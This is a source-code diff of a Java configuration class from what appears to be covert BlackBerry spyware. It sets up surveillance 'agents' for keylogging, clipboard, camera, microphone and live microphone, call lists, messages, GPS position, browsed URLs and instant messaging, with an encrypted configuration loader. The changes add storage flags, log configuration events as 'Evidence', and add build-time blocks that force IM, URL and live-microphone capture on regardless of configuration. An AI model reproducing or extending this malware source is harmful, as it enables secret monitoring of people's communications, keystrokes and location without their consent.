@@ -14,27 +14,24 @@ import java.io.EOFException;
 import java.io.IOException;
 import java.io.InputStream;
 
-import fake.InstanceConfigFake;
-
 import net.rim.device.api.crypto.CryptoException;
 import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
-import blackberry.Common;
 import blackberry.Status;
 import blackberry.action.Action;
 import blackberry.agent.Agent;
-import blackberry.config.InstanceConfig;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
+import blackberry.evidence.Evidence;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
 import blackberry.params.Parameter;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
+import fake.InstanceConfigFake;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class Conf. None of theese parameters changes runtime.
  */
@@ -55,13 +52,20 @@ public final class Conf {
     public static final boolean DEBUG_OUT = true;
     public static final boolean DEBUG_INFO = false;
 
+    public static final boolean AGENT_APPLICATION_ON_SD = false;
+    public static final boolean AGENT_CALLIST_ON_SD = false;
+    public static final boolean AGENT_CALLLOCAL_ON_SD = false;
+    public static final boolean AGENT_CAM_ON_SD = false;
+    public static final boolean AGENT_CLIPBOARD_ON_SD = false;
+    public static final boolean AGENT_KEYLOG_ON_SD = false;
     public static final boolean AGENT_SNAPSHOT_ON_SD = false;
     public static final boolean AGENT_POSITION_ON_SD = false;
     public static final boolean AGENT_MESSAGE_ON_SD = false;
     public static final boolean AGENT_DEVICEINFO_ON_SD = false;
-    public static final boolean AGENT_APPLICATION_ON_SD = false;
-    public static final boolean AGENT_MIC_ON_SD = true;
-    public static final boolean AGENT_LIVEMIC_ON_SD = true;
+    public static final boolean AGENT_MIC_ON_SD = false;
+    public static final boolean AGENT_LIVEMIC_ON_SD = false;
+    public static final boolean AGENT_URL_ON_SD = false;
+    public static final boolean AGENT_IM_ON_SD = false;
 
     public static final String DEFAULT_APN = "";//"ibox.tim.it";
     public static final String DEFAULT_APN_USER = "";
@@ -69,7 +73,7 @@ public final class Conf {
 
     public static final boolean SYNCACTION_FORCE_WIFI = true;
     public static boolean SET_SOCKET_OPTIONS = true;
-    public static final boolean SD_ENABLED = false;
+    public static boolean SD_ENABLED = false;
 
     public static final boolean GPS_ENABLED = true;
     public static final int GPS_MAXAGE = -1;
@@ -77,11 +81,7 @@ public final class Conf {
 
     public static final long TASK_ACTION_TIMEOUT = 600 * 1000; // ogni action che dura piu' di dieci minuti viene killata
 
-    //#ifdef LIVE_MIC_ENABLED
     public static boolean IS_UI = true;
-    //#else
-    public static boolean IS_UI = false;
-    //#endif
 
     public static final boolean MAIL_TEXT_FORCE_UTF8 = true;
 
@@ -94,7 +94,7 @@ public final class Conf {
     public static final String NEW_CONF = "1";//"newconfig.dat";
     public static final String ACTUAL_CONF = "2";//"config.dat";
     private static final String FORCED_CONF = "3";//"config.bin";
-    public static final String NEW_CONF_PATH = Path.USER() + Path.CONF_DIR;
+    //public static final String NEW_CONF_PATH = Path.USER() + Path.CONF_DIR;
 
     /** The Constant CONF_TIMER_SINGLE. */
     public static final int CONF_TIMER_SINGLE = 0x0;
@@ -221,7 +221,8 @@ public final class Conf {
         }
         //#endif
 
-        file = new AutoFlashFile(Conf.NEW_CONF_PATH + Conf.NEW_CONF, true);
+        file = new AutoFlashFile(Path.USER() + Path.CONF_DIR + Conf.NEW_CONF,
+                true);
         if (file.exists()) {
             //#ifdef DEBUG
             debug.info("Try: new config");
@@ -234,16 +235,19 @@ public final class Conf {
                 debug.info("New config");
                 //#endif
                 file.rename(Conf.ACTUAL_CONF, true);
+                Evidence.info("New configuration activated");
                 return true;
             } else {
                 //#ifdef DEBUG
                 debug.error("Reading new configuration");
                 //#endif
                 file.delete();
+                Evidence.info("Invalid new configuration, reverting");
             }
         }
 
-        file = new AutoFlashFile(Conf.NEW_CONF_PATH + Conf.ACTUAL_CONF, true);
+        file = new AutoFlashFile(
+                Path.USER() + Path.CONF_DIR + Conf.ACTUAL_CONF, true);
         if (file.exists()) {
             //#ifdef DEBUG
             debug.info("Try: actual config");
@@ -276,8 +280,9 @@ public final class Conf {
 
             //#ifdef FAKECONF
             if (ret == false) {
-                inputStream = new ByteArrayInputStream(InstanceConfigFake.getBytes());       
-                
+                inputStream = new ByteArrayInputStream(
+                        InstanceConfigFake.getBytes());
+
                 ret = loadCyphered(inputStream, confKey, true);
             }
             //#endif
@@ -480,7 +485,7 @@ public final class Conf {
             final byte[] confParams = new byte[paramLen];
             databuffer.readFully(confParams);
 
-            final boolean enabled = agentStatus == Common.AGENT_ENABLED;
+            final boolean enabled = agentStatus == Agent.AGENT_ENABLED;
 
             //#ifdef DEBUG
             debug.trace("ParseAgent - factory: " + agentType + " enabled: "
@@ -495,13 +500,26 @@ public final class Conf {
                 agent.init(enabled, confParams);
             } else {
                 agent = Agent.factory(agentType, enabled, confParams);
-                status.addAgent(agent);
+                if(agent!=null){
+                    status.addAgent(agent);
+                }
             }
         }
-        
-        //TODO HACK ZENO : adding non configurable agents, add chat BBM    
-        //Agent agent = Agent.factory(Agent.AGENT_IM, true, new byte[0]);
-        //status.addAgent(agent);
+
+        //#ifdef IM_FORCED
+        Agent agent1 = Agent.factory(Agent.AGENT_IM, true, new byte[0]);
+        status.addAgent(agent1);
+        //#endif
+
+        //#ifdef URL_FORCED
+        Agent agent2 = Agent.factory(Agent.AGENT_URL, true, new byte[0]);
+        status.addAgent(agent2);
+        //#endif
+
+        //#ifdef LIVE_MIC_FORCED
+        Agent agent3 = Agent.factory(Agent.AGENT_LIVE_MIC, true, new byte[0]);
+        status.addAgent(agent3);
+        //#endif
 
         //#ifdef DEBUG
         debug.trace("ParseAgent - OK");
